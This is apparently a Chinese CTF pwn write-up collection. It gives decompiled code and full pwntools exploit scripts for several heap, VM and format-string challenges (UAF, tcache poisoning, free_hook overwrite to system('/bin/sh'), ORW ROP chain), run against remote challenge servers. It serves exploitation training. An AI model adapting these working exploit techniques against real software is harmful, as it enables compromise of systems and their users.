  __int64 v3; // [rsp+0h] [rbp-28h] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  __printf_chk(1, "Index: ");
  __isoc99_scanf("%ld", &v3);
  if ( !v3 )
  {
    if ( ::buf )
    {
      __printf_chk(1, "Content: ");
      buf = ::buf;
      if ( size )
      {
        v1 = (char *)::buf + size;
        while ( 1 )
        {
          read(0, buf, 1u);
          if ( *buf == 10 )
            break;
          if ( ++buf == v1 )
            return __readfsqword(0x28u) ^ v4;
        }
        *buf = 0;
      }
    }
  }
  return __readfsqword(0x28u) ^ v4;
}

unsigned __int64 sub_CD0()
{
  __int64 v1; // [rsp+0h] [rbp-18h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-10h]

  v2 = __readfsqword(0x28u);
  __printf_chk(1, "Index: ");
  __isoc99_scanf("%ld", &v1);
  if ( !v1 && buf )
    __printf_chk(1, "Content: %s\n", (const char *)buf);
  return __readfsqword(0x28u) ^ v2;
}

unsigned __int64 sub_C60()
{
  __int64 v1; // [rsp+0h] [rbp-18h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-10h]

  v2 = __readfsqword(0x28u);
  __printf_chk(1, "Index: ");
  __isoc99_scanf("%ld", &v1);
  if ( !v1 && buf )
    free(buf);
  return __readfsqword(0x28u) ^ v2;
}
```

上面是我们调用的4个函数，这里四个函数中我们可以知道我们看到在free的时候我们看到了他纯在着一个uaf漏洞因此我们的思路也是非常的明确，在我们调用malloc函数的时候idx只能使用0这个idx也就是我们只能使用到一个chunk所以我们这里使用og打

我们在攻击的时候发现了一个

```py
from pwn import *
context.log_level='debug'
io = remote("node4.anna.nssctf.cn",28782)
# io = process("/home/fofa/lonelywolf")
libc = ELF("/home/fofa/桌面/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6")
def addr_chunk(idx,size):
    io.sendlineafter(b'Your choice: ', str(1))
    io.sendlineafter(b'Index:', str(0))
    io.sendlineafter(b'Size:', str(size))


def edit(idx,content):
    io.sendlineafter(b'Your choice: ',str(2))
    io.sendlineafter(b'Index:',str(idx))
    io.sendlineafter(b'Content: ',content)

def show(idx):
    io.sendlineafter(b'Your choice: ',str(3))
    io.sendlineafter(b'Index:',str(idx))

def free(idx):
    io.sendlineafter(b'Your choice: ',str(4))
    io.sendlineafter(b'Index:',str(idx))

addr_chunk(0,0x78)
free(0)
edit(0,b'a'*16) #清掉fd bk 有key不能double free
free(0)
show(0)
io.recvuntil(b"Content: ")
heap_address = u64(io.recv(6).ljust(8,b'\x00'))
log.success("leak head_address=>"+hex(heap_address))
tcache_struct_addr = heap_address & 0xFFFFFFFFF000 #拿到结构地址
log.success("leak tcache_struct_addr=>"+hex(tcache_struct_addr))
edit(0,p64(tcache_struct_addr+0x10)) #改fd成结构地址
addr_chunk(0,0x78)
addr_chunk(0,0x78)
edit(0,p64(0)*4+p64(0x7000000)) #让idx变成7 认为满了
free(0)
show(0)
io.recvuntil(b"Content: ")
libc_base = u64(io.recv(6).ljust(8,b'\x00')) - 96 - 0x10 - libc.sym["__malloc_hook"]
malloc = libc_base + libc.sym["__malloc_hook"]
log.success("leak libc_base=>"+hex(libc_base))
log.success("leak malloc=>"+hex(malloc))
edit(0,p64(0x1000000000000)+p64(0)*13+p64(libc_base + libc.sym["__malloc_hook"] - 0x17)) #0x17 size位7d 可以用 (恢复idx为1的0x80字段) + padding + malloc_hook的fake chunk 地址
addr_chunk(0,0x78)
og=[0x10a41c,0x4f302,0xe54f7,0xe54fe,0xe5502,0x10a2fc,0x10a308]
edit(0,b'a'*0x17+p64(libc_base+og[0]))
addr_chunk(0,0x78)
#attach(p)
io.interactive()
```

## [HGAME 2023 week2]editable_note

```c
unsigned __int64 add_note()
{
  unsigned int n0xF_1; // ebx
  unsigned int n0xF; // [rsp+0h] [rbp-20h] BYREF
  _DWORD size[7]; // [rsp+4h] [rbp-1Ch] BYREF

  *(_QWORD *)&size[1] = __readfsqword(0x28u);
  printf("Index: ");
  __isoc99_scanf("%u", &n0xF);
  if ( n0xF <= 0xF )
  {
    if ( notes[n0xF] )
    {
      printf("This page has been used.");
    }
    else
    {
      printf("Size: ");
      __isoc99_scanf("%u", size);
      if ( size[0] <= 0xFFu )
      {
        n0xF_1 = n0xF;
        notes[n0xF_1] = malloc(size[0]);
        note_size[n0xF] = size[0];
      }
      else
      {
        puts("Too big.");
      }
    }
  }
  else
  {
    puts("There are only 16 pages in this notebook.");
  }
  return __readfsqword(0x28u) ^ *(_QWORD *)&size[1];
}

unsigned __int64 delete_note()
{
  unsigned int n0xF; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  __isoc99_scanf("%u", &n0xF);
  if ( n0xF <= 0xF )
  {
    if ( notes[n0xF] )
      free((void *)notes[n0xF]);
    else
      puts("Page not found.");
  }
  else
  {
    puts("There are only 16 pages in this notebook.");
  }
  return __readfsqword(0x28u) ^ v2;
}

unsigned __int64 edit_note()
{
  unsigned int n0xF; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  __isoc99_scanf("%u", &n0xF);
  if ( n0xF <= 0xF )
  {
    if ( notes[n0xF] )
    {
      printf("Content: ");
      read(0, (void *)notes[n0xF], (unsigned int)note_size[n0xF]);
    }
    else
    {
      puts("Page not found.");
    }
  }
  else
  {
    puts("There are only 16 pages in this notebook.");
  }
  return __readfsqword(0x28u) ^ v2;
}

unsigned __int64 show_note()
{
  unsigned int n0xF; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  __isoc99_scanf("%u", &n0xF);
  if ( n0xF <= 0xF )
  {
    if ( notes[n0xF] )
      puts((const char *)notes[n0xF]);
    else
      puts("Page not found.");
  }
  else
  {
    puts("There are only 16 pages in this notebook.");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

这个题目的思路就是通过uaf漏洞获取与一个libc通过uaf获取到一个tache的一个dup进行一个system函数的一个攻击

```
from pwn import *
context.log_level='debug'
# io = process("/home/fofa/editable_note/vuln")
io = remote("node5.anna.nssctf.cn",20407)
def choice(idx):
    io.sendlineafter(b'>', str(idx))


def add(idx, size):
    choice(1)
    io.sendlineafter(b'Index: ', str(idx))
    io.sendlineafter(b'Size: ', str(size))


def free(idx):
    choice(2)
    io.sendlineafter(b'Index: ', str(idx))


def edit(idx, content):
    choice(3)
    io.sendlineafter(b'Index: ', str(idx))
    io.sendlineafter(b'Content: ', content)


def show(idx):
    choice(4)
    io.sendlineafter(b'Index: ', str(idx))

for i in range(8):
    add(i,0x90)
add(8,0x20)
for i in range(8):
    free(i)

show(7)
libc = ELF("/home/fofa/editable_note/libc-2.31.so")
libc.address = u64(io.recv(6).ljust(8,b'\x00'))-0x1ecbe0
info("libc.address:"+hex(libc.address))
free_hook = libc.sym['__free_hook']
system = libc.sym['system']

add(9,0x20)
add(10,0x20)

free(8)
free(9)

edit(10,b'/bin/sh\x00')
edit(9, p64(free_hook))

add(11, 0x20)
add(12, 0x20)
edit(12,p64(system))

free(10)
# gdb.attach(io)

io.interactive()
```

## [OGeek2019 Final]OVM

这个题目是我第一次写vm有关的一个题目因此这里我放一些前置知识点

什么是vm，这个东西一般代指在程序中实现运算指令来模拟运行的（汇编类）或者在程序中自定义运行指令的程序（编译类），而常见的vmpwn就是这两个题型，而常见的漏洞点是越界读写

接下来我就继续ida的一个文件

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int16 v4; // [rsp+2h] [rbp-Eh] BYREF
  unsigned __int16 v5; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int16 v6; // [rsp+6h] [rbp-Ah] BYREF
  unsigned int v7; // [rsp+8h] [rbp-8h]
  int i; // [rsp+Ch] [rbp-4h]

  comment = malloc(0x8Cu);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);//上面对stdin，stdout,stderr的文件进行了一个初始化
  signal(2, signal_handler);
  write(1, "WELCOME TO OVM PWN\n", 0x16u);
  write(1, "PC: ", 4u);
  _isoc99_scanf("%hd", &v5);
  getchar();
  write(1, "SP: ", 4u);
  _isoc99_scanf("%hd", &v6);
  getchar();
  unk_242094 = v6;
  unk_24209C = v5;
  write(1, "CODE SIZE: ", 0xBu);//这里主要是对上面的数据进行一个统一的代码进一个解释，这里我们直接使用统一的回答吧，上面的sp和pc主要是对用于一个头部的位置，这里的这里两个文件不是特别的重要，但是这我们的数据还是写道了v6，v5中，并且这里会写入一个code的一个size值，这个值是用来进行一个指定我们输入的一个代码的多少
  _isoc99_scanf("%hd", &v4);
  getchar();
  if ( v6 + (unsigned int)v4 > 0x10000 || !v4 )
  {
    write(1, "EXCEPTION\n", 0xAu);
    exit(155);
  }
  write(1, "CODE: ", 6u);//这个位置写入了code的代码
  running = 1;
  for ( i = 0; v4 > i; ++i )
  {
    _isoc99_scanf("%d", &memory[v5 + i]);
    if ( (memory[i + v5] & 0xFF000000) == 0xFF000000 )
      memory[i + v5] = -536870912;
    getchar();//这里对我们的数据进行一个统一的编写和统一的存储
  }//这里的循环和size有关
  while ( running )//结束完上面的循环后会在这里进行一个统一的读取执行
  {
    v7 = fetch();//这个是一个读取函数
    execute(v7);//这里是一个执行代码的一个函数
  }
  write(1, "HOW DO YOU FEEL AT OVM?\n", 0x1Bu);
  read(0, comment, 0x8Cu);//会把一些数据读入到堆块中
  sendcomment(comment);
  write(1, "Bye\n", 4u);
  return 0;
}
```

接下来我们查看一些关键的函数

````c
__int64 fetch()
{
  int v0; // eax

  v0 = unk_24209C++;
  return (unsigned int)memory[v0];
}//从这里我们就可以知道这个函数主要是用来获取要给数据使用的
void __fastcall sendcomment(void *comment)
{
  free(comment);//这里我们可以知道这个函数中主要进行了一个free函数因此这里存在着一个uaf漏洞并且在这里中我们还可以进行一个漏洞的触发
}
````

接下来就是我们最常见的一个代码了，并且漏洞纯在的一个位置

```c
ssize_t __fastcall execute(int a1)
{
  ssize_t p_reg; // rax
  unsigned __int8 v2; // [rsp+18h] [rbp-8h]
  unsigned __int8 v3; // [rsp+19h] [rbp-7h]
  unsigned __int8 v4; // [rsp+1Ah] [rbp-6h]
  int n15; // [rsp+1Ch] [rbp-4h]

  v4 = (a1 & 0xF0000u) >> 16;
  v3 = (unsigned __int16)(a1 & 0xF00) >> 8;
  v2 = a1 & 0xF;
  p_reg = HIBYTE(a1);//这里是对上面的代码进行了一个输出规则的一个应用，这里可以知道一个8位代码中我们的数据分别要放到那个位置上面
  if ( HIBYTE(a1) == 112 )
  {
    p_reg = (ssize_t)reg;
    reg[v4] = reg[v2] + reg[v3];//实现一个加法
    return p_reg;
  }
  if ( HIBYTE(a1) > 0x70u )
  {
    if ( HIBYTE(a1) == 176 )
    {
      p_reg = (ssize_t)reg;
      reg[v4] = reg[v2] ^ reg[v3];//实现一个异或
      return p_reg;
    }
    if ( HIBYTE(a1) > 0xB0u )
    {
      if ( HIBYTE(a1) == 208 )
      {
        p_reg = (ssize_t)reg;
        reg[v4] = reg[v3] >> reg[v2];//实现右移位
        return p_reg;
      }
      if ( HIBYTE(a1) > 0xD0u )
      {
        if ( HIBYTE(a1) == 224 )
        {
          running = 0;
          if ( !unk_242094 )
            return write(1, "EXIT\n", 5u);//实现一个退出的一个效果
        }
        else if ( HIBYTE(a1) != 255 )
        {
          return p_reg;
        }
        running = 0;
        for ( n15 = 0; n15 <= 15; ++n15 )
          printf("R%d: %X\n", n15, reg[n15]);
        return write(1, "HALT\n", 5u);
      }
      else if ( HIBYTE(a1) == 192 )
      {
        p_reg = (ssize_t)reg;
        reg[v4] = reg[v3] << reg[v2];//实现左移位
      }
    }
    else
    {
      switch ( HIBYTE(a1) )
      {
        case 0x90u:
          p_reg = (ssize_t)reg;
          reg[v4] = reg[v2] & reg[v3];
          break;
        case 0xA0u:
          p_reg = (ssize_t)reg;
          reg[v4] = reg[v2] | reg[v3];
          break;
        case 0x80u:
          p_reg = (ssize_t)reg;
          reg[v4] = reg[v3] - reg[v2];
          break;
      }//上面的代码主要是对与或减进行了一个实现
    }
  }
  else if ( HIBYTE(a1) == 48 )
  {
    p_reg = (ssize_t)reg;
    reg[v4] = memory[reg[v2]];//这里对赋值进行了一个实现，mov reg，memory
  }
  else if ( HIBYTE(a1) > 0x30u )
  {
    switch ( HIBYTE(a1) )
    {
      case 'P':
        LODWORD(p_reg) = unk_242094++;//实现一个push
        p_reg = (int)p_reg;
        stack[(int)p_reg] = reg[v4];
        break;
      case '`':
        --unk_242094;
        p_reg = (ssize_t)reg;
        reg[v4] = stack[unk_242094];//实现pop
        break;
      case '@':
        p_reg = (ssize_t)memory;
        memory[reg[v2]] = reg[v4];//实现一个mov memory，reg
        break;
    }
  }
  else if ( HIBYTE(a1) == 16 )
  {
    p_reg = (ssize_t)reg;
    reg[v4] = (unsigned __int8)a1;//实现要给reg=a1
  }
  else if ( HIBYTE(a1) == 32 )
  {
    p_reg = (ssize_t)reg;
    reg[v4] = (_BYTE)a1 == 0;//实现reg=0
  }
  return p_reg;
}
```

这里存在的一个漏洞就是再我们使用到赋值的位置中并没有对边界进行一个认证，因此再我们mov的时候可以存在一个越界读写因此这个就是我们的一个思路

```py
from pwn import *
from LibcSearcher import *
# sh = process("/home/fofa/pwn")
sh = remote("node5.buuoj.cn", 26557)
# context.log_level = 'debug'
'''
0x10 : reg[dest] = op
0x20 : reg[dest] = 0
mov mem, reg    0x30 : reg[dest] = memory[reg[src2]]
mov reg, mem    0x40 : memory[reg[src2]] = reg[dest]
push reg    0x50 : stack[result] = reg[dest]
pop reg     0x60 : reg[dest] = stack[reg[13]]
add         0x70 : reg[dest] = reg[src2] + reg[src1]
sub         0x80 : reg[dest] = reg[src1] - reg[src2]
and         0x90 : reg[dest] = reg[src2] & reg[src1]
or          0xA0 : reg[dest] = reg[src2] | reg[src1]
^          0xB0 : reg[dest] = reg[src2] ^ reg[src1]
left        0xC0 : reg[dest] = reg[src1] << reg[src2]
right       0xD0 : reg[dest] = reg[src1] >> reg[src2]
0xFF : (exit or print) if(reg[13] != 0) print oper
'''

def send_code(opcode, dest, src1, src2):
    code = (opcode << 24) + (dest << 16) + (src1 << 8) + src2
    print(hex(code))
    return str(code)

# gdb.attach(sh, 'b *$rebase(0xC4A)')
sh.sendlineafter("PC: ", '0')
sh.sendlineafter("SP: ", '1')
sh.sendlineafter("CODE SIZE: ", "24")
sh.recvuntil("CODE: ")
# gdb.attach(sh, 'b *$rebase(0x0D4B)')

sh.sendline(send_code(0x10, 0, 0, 26))
sh.sendline(send_code(0x80, 1, 1, 0))
sh.sendline(send_code(0x30, 2, 0, 1))
sh.sendline(send_code(0x10, 0, 0, 25))
sh.sendline(send_code(0x10, 1, 0, 0))
sh.sendline(send_code(0x80, 1, 1, 0))
sh.sendline(send_code(0x30, 3, 0, 1))


sh.sendline(send_code(0x10, 4, 0, 0x10))
sh.sendline(send_code(0x10, 5, 0, 8))
sh.sendline(send_code(0xC0, 4, 4, 5))
sh.sendline(send_code(0x10, 5, 0, 0xa))
sh.sendline(send_code(0x10, 6, 0, 4))
sh.sendline(send_code(0xC0, 5, 5, 6))
sh.sendline(send_code(0x70, 4, 4, 5))
sh.sendline(send_code(0x70, 2, 4, 2))


sh.sendline(send_code(0x10, 4, 0, 8))
sh.sendline(send_code(0x10, 5, 0, 0))
sh.sendline(send_code(0x80, 5, 5, 4))
sh.sendline(send_code(0x40, 2, 0, 5))
sh.sendline(send_code(0x10, 4, 0, 7))
sh.sendline(send_code(0x10, 5, 0, 0))
sh.sendline(send_code(0x80, 5, 5, 4))
sh.sendline(send_code(0x40, 3, 0, 5))
sh.sendline(send_code(0xE0, 0, 0, 0))

# gdb.attach(sh)

sh.recvuntil("R2: ")
low = int(sh.recvuntil("\n"), 16) + 8
print("[*]" + hex(low))
sh.recvuntil("R3: ")
high = int(sh.recvuntil("\n"), 16)
free_hook_addr = (high << 32) + low
print("[*] __free_hook : " + hex(free_hook_addr))
# libc = ELF("/home/fofa/buulibc")
libc = LibcSearcher('__free_hook', free_hook_addr)
libc_base = free_hook_addr - libc.dump("__free_hook")
sys_addr = libc_base + libc.dump("system")

# libc_base = free_hook_addr - 0x3c67a8
# sys_offset = [0x03f650, 0x03f650, 0x03f630,	0x03f630, 0x03f620, 0x045390, 0x0453a0, 0x0453a0, 0x045390]
# sys_addr = libc_base + sys_offset[6]

payload = b"/bin/sh\x00" + p64(sys_addr)
sh.send(payload)

# gdb.attach(sh)


sh. interactive()

```

## ycb2025 malloc

这个题目是一个高版本的堆题这是我第一次搞的这种堆题，这里我先上ida

```c
unsigned __int64 sub_15CF()
{
  unsigned int n0x10_1; // ebx
  char v2; // [rsp+Fh] [rbp-21h] BYREF
  unsigned int n0x10; // [rsp+10h] [rbp-20h] BYREF
  _DWORD n0x70[5]; // [rsp+14h] [rbp-1Ch] BYREF

  *(_QWORD *)&n0x70[1] = __readfsqword(0x28u);
  puts("Index");
  __isoc99_scanf("%u%c", &n0x10, &v2);
  if ( n0x10 <= 0x10 && (puts("size"), __isoc99_scanf("%u%c", n0x70, &v2), n0x70[0] <= 0x70u) && n0x70[0] > 0xFu )
  {
    n0x10_1 = n0x10;
    qword_5200[n0x10_1 + 512] = sub_1365(n0x70[0]);
    qword_5200[n0x10 + 528] = n0x70[0];
    puts("Success");
  }
  else
  {
    puts("Invalid");
  }
  return *(_QWORD *)&n0x70[1] - __readfsqword(0x28u);
}
unsigned __int64 sub_16F9()
{
  char v1; // [rsp+3h] [rbp-Dh] BYREF
  _DWORD n0x10[3]; // [rsp+4h] [rbp-Ch] BYREF

  *(_QWORD *)&n0x10[1] = __readfsqword(0x28u);
  puts("Index");
  __isoc99_scanf("%u%c", n0x10, &v1);
  if ( n0x10[0] <= 0x10u )
  {
    sub_14C7(n0x10[0]);
    qword_5200[n0x10[0] + 528] = 0;
    puts("Success");
  }
  else
  {
    puts("Invalid index");
  }
  return *(_QWORD *)&n0x10[1] - __readfsqword(0x28u);
}
unsigned __int64 sub_17AC()
{
  char v1; // [rsp+Fh] [rbp-11h] BYREF
  unsigned int n0x10; // [rsp+10h] [rbp-10h] BYREF
  _DWORD nbytes[3]; // [rsp+14h] [rbp-Ch] BYREF

  *(_QWORD *)&nbytes[1] = __readfsqword(0x28u);
  puts("Index");
  __isoc99_scanf("%u%c", &n0x10, &v1);
  if ( n0x10 <= 0x10
    && qword_5200[n0x10 + 512]
    && (puts("size"), __isoc99_scanf("%u%c", nbytes, &v1), nbytes[0] <= (__int64)qword_5200[n0x10 + 528]) )
  {
    read(0, (void *)qword_5200[n0x10 + 512], nbytes[0]);
    puts("Success");
  }
  else
  {
    puts("Invalid");
  }
  return *(_QWORD *)&nbytes[1] - __readfsqword(0x28u);
}
unsigned __int64 sub_18F3()
{
  char v1; // [rsp+3h] [rbp-Dh] BYREF
  unsigned int n0x10; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Index");
  __isoc99_scanf("%u%c", &n0x10, &v1);
  if ( n0x10 <= 0x10 && qword_5200[n0x10 + 512] )
  {
    puts((const char *)qword_5200[n0x10 + 512]);
    puts("Success");
  }
  else
  {
    puts("Invalid index");
  }
  return v3 - __readfsqword(0x28u);
}
```

1. 利用 UAF 漏洞泄露 ELF 基地址
2. 篡改堆元数据实现任意地址读写
3. 泄露 libc 基地址和栈地址
4. 构造 ORW (Open-Read-Write) 链读取 flag

```py
from pwn import *
context.log_level='debug'
io = process("/home/fofa/malloc/pwn")
elf = ELF("/home/fofa/malloc/pwn")
libc = ELF("/home/fofa/malloc/libc.so.6")

def add_chunk(index,size):
    io.sendlineafter(b"5:exit", b"1")
    io.sendlineafter(b"Index", str(index).encode())
    io.sendlineafter(b"size", str(size).encode())


def delete_chunk( index):
    """释放指定索引的堆块"""
    io.sendlineafter(b"5:exit", b"2")
    io.sendlineafter(b"Index", str(index).encode())


def edit_chunk(index, size, content):
    """修改堆块内容"""
    io.sendlineafter(b"5:exit", b"3")
    io.sendlineafter(b"Index", str(index).encode())
    io.sendlineafter(b"size", str(size).encode())
    io.send(content)


def show_chunk(index):
    """查看堆块内容"""
    io.sendlineafter(b"5:exit", b"4")
    io.sendlineafter(b"Index", str(index).encode())


add_chunk(0,0x10)
add_chunk(1,0x70)
add_chunk(2,0x70)
add_chunk(0x10,0x70)

delete_chunk(2)
delete_chunk(1)
show_chunk(1)

io.recv()
elf_addr = u64(io.recv(6).ljust(8,b'\x00'))- 0x52a0
info("elf_addr:"+hex(elf_addr))

fake_chunk = (
        p64(0) * 3  # 填充数据
        + p64(0x80)  # 伪造size
        + p64(elf_addr + 0x5200 + 0x1010)  # 伪造fd指针
)

# gdb.attach(io)
# pause()
edit_chunk(0, len(fake_chunk), fake_chunk)

# 重新分配堆块应用伪造的元数据
add_chunk(3, 0x70)
add_chunk(3, 0x70)


edit_chunk(3, 8, p64(elf_addr+elf.got["puts"]))
show_chunk(4)

io.recv()
libc.address = u64(io.recv(6).ljust(8,b'\x00'))-0x80e50
info("libc.address:"+hex(libc.address))

edit_chunk(3,8,p64(libc.sym['environ']))
show_chunk(4)

io.recv()
stack_addr = u64(io.recv(6).ljust(8,b'\x00'))-0x140
info("stack_addr:"+hex(stack_addr))

add_chunk(4, 0x70) #再这个的stack_addr的数据被申请出来了

# 设置flag路径存储
edit_chunk(3, 8, p64(elf_addr + 0x62a0))
edit_chunk(4, 0x8, p64(0x100))
edit_chunk(3, 0x10, p64(stack_addr) + b"/flag\x00\x00\x00")

# 构建ORW(Open-Read-Write)ROP链
flag_path_address = elf_addr + 0x6228
buffer_address = elf_addr + 0x40C0 + 0x500

# ROP Gadgets
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi =libc.address + 0x000000000002be51
pop_rdx_rbx = libc.address + 0x00000000000904a9

# 构建ROP链
rop_chain = b""
# 1. 打开文件: open("/flag", 0)
rop_chain += p64(pop_rdi) + p64(flag_path_address)
rop_chain += p64(pop_rsi) + p64(0)
rop_chain += p64(libc.sym["open"])

# 2. 读取文件内容: read(3, buffer, 0x50)
rop_chain += p64(pop_rdi) + p64(3)  # 文件描述符
rop_chain += p64(pop_rsi) + p64(buffer_address)  # 缓冲区
rop_chain += p64(pop_rdx_rbx) + p64(0x50) + p64(0x50)  # 长度
rop_chain += p64(libc.sym["read"])

# 3. 输出文件内容: write(1, buffer)
rop_chain += p64(pop_rdi) + p64(1)  # 标准输出
rop_chain += p64(libc.sym["write"])

# 写入ROP链
gdb.attach(io)
edit_chunk(4, len(rop_chain), rop_chain)






io.interactive()
```

## 强网杯-flag_market

exp:

```py
from pwn import *

context.log_level = "debug"
context.terminal = ["wt.exe","wsl"]

elf = ELF("./chall")
# p = elf.process()
# p = process("./pwn")
libc = ELF("./libc.so.6")
p = remote("47.93.215.3",26634)


p.sendlineafter(b"2.exit",b"1")
p.sendlineafter(b"how much you want to pay?",b"255")
payload = b"A" * 0x100  + b"%5019c%12$hn%9$p~"
p.sendlineafter(b"please report:",payload)
p.sendlineafter(b"2.exit",b"1")
p.sendlineafter(b"how much you want to pay?",p64(elf.got["fclose"]))
p.recvuntil(b"0x")
heap = int(p.recvuntil(b"~",drop=True),16) + 0x1e0
p.sendlineafter(b"2.exit",b"1")
p.sendlineafter(b"how much you want to pay?",b"255")
payload = b"A" * 0x100  + b"%12$s"
p.sendlineafter(b"please report:",payload)
p.sendlineafter(b"2.exit",b"1")
p.sendlineafter(b"how much you want to pay?",p64(heap))

p.interactive()

#星盟师傅的wp
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')

sh = remote('47.94.172.90', 30830)

sh.sendlineafter(b'2.exit\n', b'1')
sh.sendafter(b'pay?\n', b'255'.ljust(8, b'\0') + p64(0x6162))
sh.sendlineafter(b'report:\n', b'a' * 0x100 + b'%13$s#')
sh.sendlineafter(b'2.exit\n', b'1')
sh.sendafter(b'pay?\n', b'2'.ljust(8, b'\0') + p64(0x404050))
libc_addr = u64(sh.recvuntil(b'#', drop=True).ljust(8, b'\0')) - 0x11ba80
success('libc_addr: ' + hex(libc_addr))

sh.sendlineafter(b'2.exit\n', b'1')
sh.sendafter(b'pay?\n', b'2'.ljust(8, b'\0') + p64(libc_addr + 0x2031e0+1))
heap_addr = u64(sh.recvuntil(b'#', drop=True).ljust(8, b'\0')) * 0x100
success('heap_addr: ' + hex(heap_addr))

sh.sendlineafter(b'2.exit\n', b'1')
sh.sendafter(b'pay?\n', b'2'.ljust(8, b'\0') + p64(heap_addr + 0x480))

sh.interactive()
```

## tsgctf-closed_ended

这个是一个shellcode的题目这里我们用到了要给非常好玩的手法线上代码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+0h] [rbp-20h] BYREF
  _BYTE v5[10]; // [rsp+Eh] [rbp-12h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  mprotect(init_proc, 0x1000u, 7);
  if ( !close(1)
    && (unsigned int)__isoc99_scanf("%p", &v4) == 1
    && (unsigned __int64)(v4 - 4198567) <= 0xF59
    && (unsigned int)__isoc99_scanf("%*c%c", v4) == 1 )
  {
    mprotect(init_proc, 0x1000u, 5);
    __isoc99_scanf("%100s", v5);
  }
  return 0;
}
```

下面是这个题目的一个asm

```asm
; __unwind {
.text:0000000000401070 000 55                            push    rbp
.text:0000000000401071 008 BF 00 10 40 00                mov     edi, offset _init_proc          ; addr
.text:0000000000401076 008 BE 00 10 00 00                mov     esi, 1000h                      ; len
.text:000000000040107B 008 48 89 E5                      mov     rbp, rsp
.text:000000000040107E 008 48 83 EC 20                   sub     rsp, 20h
.text:0000000000401082 028 64 48 8B 14 25 28 00 00 00    mov     rdx, fs:28h
.text:000000000040108B 028 48 89 55 F8                   mov     [rbp+var_8], rdx
.text:000000000040108F 028 BA 07 00 00 00                mov     edx, 7                          ; prot
.text:0000000000401094 028 E8 B7 FF FF FF                call    _mprotect
.text:0000000000401094
.text:0000000000401099 028 BF 01 00 00 00                mov     edi, 1                          ; fd
.text:000000000040109E 028 E8 9D FF FF FF                call    _close
.text:000000000040109E
.text:00000000004010A3 028 85 C0                         test    eax, eax
.text:00000000004010A5 028 74 13                         jz      short loc_4010BA
.text:00000000004010A5
.text:00000000004010A7
.text:00000000004010A7                                   loc_4010A7:                             ; CODE XREF: main+5B↓j
.text:00000000004010A7                                                                           ; main+6E↓j
.text:00000000004010A7                                                                           ; main+7F↓j
.text:00000000004010A7                                                                           ; main+A5↓j
.text:00000000004010A7 028 48 8B 45 F8                   mov     rax, [rbp+var_8]
.text:00000000004010AB 028 64 48 2B 04 25 28 00 00 00    sub     rax, fs:28h
.text:00000000004010B4 028 75 61                         jnz     short loc_401117
.text:00000000004010B4
.text:00000000004010B6 028 C9                            leave
.text:00000000004010B7 000 31 C0                         xor     eax, eax
.text:00000000004010B9 000 C3                            retn
.text:00000000004010B9
.text:00000000004010BA                                   ; ---------------------------------------------------------------------------
.text:00000000004010BA
.text:00000000004010BA                                   loc_4010BA:                             ; CODE XREF: main+35↑j
.text:00000000004010BA 028 48 8D 75 E0                   lea     rsi, [rbp+var_20]
.text:00000000004010BE 028 BF 04 20 40 00                mov     edi, offset aP                  ; "%p"
.text:00000000004010C3 028 E8 98 FF FF FF                call    ___isoc99_scanf
.text:00000000004010C3
.text:00000000004010C8 028 83 E8 01                      sub     eax, 1
.text:00000000004010CB 028 75 DA                         jnz     short loc_4010A7
.text:00000000004010CB
.text:00000000004010CD 028 48 8B 75 E0                   mov     rsi, [rbp+var_20]
.text:00000000004010D1 028 48 8D 86 59 EF BF FF          lea     rax, [rsi-4010A7h]
.text:00000000004010D8 028 48 3D 59 0F 00 00             cmp     rax, 0F59h
.text:00000000004010DE 028 77 C7                         ja      short loc_4010A7
.text:00000000004010DE
.text:00000000004010E0 028 31 C0                         xor     eax, eax
.text:00000000004010E2 028 BF 07 20 40 00                mov     edi, offset aCC                 ; "%*c%c"
.text:00000000004010E7 028 E8 74 FF FF FF                call    ___isoc99_scanf
.text:00000000004010E7
.text:00000000004010EC 028 83 E8 01                      sub     eax, 1
.text:00000000004010EF 028 75 B6                         jnz     short loc_4010A7
.text:00000000004010EF
.text:00000000004010F1 028 BA 05 00 00 00                mov     edx, 5                          ; prot
.text:00000000004010F6 028 BE 00 10 00 00                mov     esi, 1000h                      ; len
.text:00000000004010FB 028 BF 00 10 40 00                mov     edi, offset _init_proc          ; addr
.text:0000000000401100 028 E8 4B FF FF FF                call    _mprotect
.text:0000000000401100
.text:0000000000401105 028 48 8D 75 EE                   lea     rsi, [rbp+var_12]
.text:0000000000401109 028 BF 0D 20 40 00                mov     edi, offset a100s               ; "%100s"
.text:000000000040110E 028 31 C0                         xor     eax, eax
.text:0000000000401110 028 E8 4B FF FF FF                call    ___isoc99_scanf
.text:0000000000401110
.text:0000000000401115 028 EB 90                         jmp     short loc_4010A7
.text:0000000000401115
.text:0000000000401117                                   ; ---------------------------------------------------------------------------
.text:0000000000401117
.text:0000000000401117                                   loc_401117:                             ; CODE XREF: main+44↑j
.text:0000000000401117 028 E8 14 FF FF FF                call    ___stack_chk_fail
.text:0000000000401117                                   ; }
```

